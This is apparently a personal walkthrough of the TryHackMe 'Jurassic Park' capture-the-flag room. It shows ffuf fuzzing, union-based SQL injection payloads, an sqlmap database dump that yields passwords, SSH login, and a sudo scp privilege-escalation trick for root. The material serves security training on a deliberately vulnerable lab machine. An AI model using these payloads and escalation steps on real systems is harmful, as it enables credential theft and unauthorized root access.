# Jurassic Park CTF - TryHackMe Room
# **!! SPOILERS !!**
#### This repository documents my walkthrough for the **Jurassic Park** CTF challenge on [TryHackMe](https://tryhackme.com/room/jurassicpark). 
---

we see open ports 22 and 80

![scn](imgs/scn.png "scn")

from feroxbuster we see some hidden files 

![fr](imgs/fr.png "fr")

/robots.txt nothing interesting just some references 

![rb](imgs/rb.png "rb")

/delete might suggest some MySQL database

![de](imgs/de.png "de")

main page we see a link to a shop

![m](imgs/m.png "m")

in /item.php we see parameter `id`

![id](imgs/id.png "id")

we can try to fuzz this parameter to test for IDOR first

```
ffuf -w /usr/share/seclists/Fuzzing/3-digits-000-999.txt -u http://$IP/item.php\?id\=FUZZ -fs 81
```

![ff](imgs/ff.png "ff")

in ?id=005 we see diffrent site with some more hints about WAF and blocked characters

![5](imgs/5.png "5")

in ?id=100 we see other diffrent site with weird values

![1](imgs/1.png "1")

from ZAP Active Scan we know about potential SQLi

![za](imgs/za.png "za")

after fuzzing SQLi we see that some payloads are reflected

![re](imgs/re.png "re")

we see that if we use `'` there is indeed some protection against attacks

![wa](imgs/wa.png "wa")

we can try union based attack by using payload: `100 union select 1`

![un](imgs/un.png "un")

we see an error but we might be on right path we need to adjust column number

after adjusting the number we got working response that gives us some clue about database, working payload 

```
?id=100 union select 1,2,3,4,5
```

![unn](imgs/unn.png "unn")

now we can use functions like: `database()` and `version()` to gain more info about db

```
?id=100 union select 1,2,3,version(),5

?id=100 union select 1,2,3,database(),5
```

![ver](imgs/ver.png "ver")

![db](imgs/db.png "db")

we can test further with sqlmap

```
sqlmap -u "http://10.10.16.110/item.php?id=100" --dump --batch --dbs park
```

![dbb](imgs/dbb.png "dbb")

we found passwords, we also know about username dennis from pages that we fuzzed

![ssh](imgs/ssh.png "ssh")

after logging as dennis via ssh we can grab first flag

![f1](imgs/f1.png "f1")

by looking at the `.bash_history` we can see flag number 3

![f3](imgs/f3.png "f3")

we can look into `sudo -l` output, we also can check GTFObins for way to gain root access

![sd](imgs/sd.png "sd")

![gt](imgs/gt.png "gt")

we can easily replicate the steps to become root

```
$ TF=$(mktemp)
$ echo 'sh 0<&2 1>&2' > $TF
$ chmod +x "$TF"
$ sudo scp -S $TF x y:
```

![rt](imgs/rt.png "rt")

now we need to find rest of the flags

flag number 5 is in /root

![f5](imgs/f5.png "f5")

to find flag number 2 I used simple find command

```
find / -name "*flag*" 2>/dev/null
```

![f2](imgs/f2.png "f2")

# MACHINE PWNED
